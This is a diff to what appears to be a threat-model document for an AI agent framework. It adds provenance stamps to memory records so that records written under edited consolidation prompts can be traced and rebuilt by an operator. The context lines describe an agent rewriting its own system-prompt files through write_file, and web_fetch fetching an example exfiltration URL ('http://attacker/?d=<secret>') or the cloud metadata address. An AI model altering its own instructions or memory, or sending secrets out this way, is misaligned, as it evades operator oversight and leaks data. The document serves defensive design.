@@ -276,7 +276,9 @@ live onto every matching channel, so one edit widens a whole transport.
 `write_file` can also
 rewrite any file named in a list-form `agent.system_prompt`, which is a
 persistent persona change that never touches `agent.yaml` and takes effect
-on the next restart or new channel. `web_fetch` has
+on the next restart or new channel. An edit to `memory.consolidation_prompt`
+or `memory.consolidation_fork_prompt` is identifiable afterwards: records
+written under it carry its hash (finding 13). `web_fetch` has
 no scheme or host check, follows redirects, and will happily GET
 `http://attacker/?d=<secret>` or `http://169.254.169.254/`.
 
@@ -707,7 +709,17 @@ What each kind of unlock costs:
   summarizes, consolidates and scores its own exchanges, under its own
   persona, and the results persist: a summary it later reads as its own
   words, a memory record, an `exchange_log` score. Unlocking fork
-  instructions also removes a bound finding 8 relies on.
+  instructions also removes a bound finding 8 relies on. Memory records
+  now carry a stamp (`prompt_hash`, `mode`, `model`; the instruction text is
+  in `memory_prompt`), so the records an edited
+  `memory.consolidation_prompt` or `memory.consolidation_fork_prompt`
+  produced can be found afterwards, and the operator can rebuild them with
+  `corvidae memory reconsolidate`. That command is operator-only, never a
+  tool. The stamp records the consolidation instructions only, never the
+  system prompt and window a fork runs under, so an edit to the system
+  prompt isn't identifiable this way. `memory_prompt` holds instruction
+  text, never conversation text. Re-consolidation keeps a demoted record
+  demoted, so it doesn't bring old records back into retrieval.
 - **Other prompts sent on the agent's behalf** (subagent, heartbeat,
   notification text). Each steers a turn that has no person in it: a
   rewritten heartbeat prompt acts on memory with nobody watching
